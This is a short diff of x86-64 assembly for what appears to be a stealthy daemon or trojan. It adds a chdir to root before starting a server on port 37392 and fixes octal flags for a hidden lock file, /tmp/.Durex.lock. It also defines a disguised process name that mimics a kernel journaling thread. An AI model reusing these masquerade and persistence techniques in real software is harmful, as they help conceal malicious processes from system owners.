@@ -33,6 +33,10 @@ _start:
     syscall
     cmp     eax, 0
     jne     exit
+    lea     rdi, [rel dir]
+    xor     eax, eax
+    add     eax, 0x50
+    syscall
     mov     rdi, DWORD 37392
     call    create_server
     xor     eax, eax
@@ -78,8 +82,8 @@ check_instance:
     xor     rdx, rdx
     xor     rax, rax
     lea     rdi, [rel lock_name]
-    add     esi, 2 | 0100 ; O_RDWR | O_CREAT
-    add     edx, 0600
+    add     esi, 2 | 100o ; O_RDWR | O_CREAT
+    add     edx, 600o
     add     eax, 0x02 ; open
     syscall
     mov     edx, eax
@@ -99,3 +103,4 @@ check_instance:
 
     lock_name: db "/tmp/.Durex.lock", 0
     pname: db "[jbd2/sda1-8]", 0
+    dir: db "/", 0
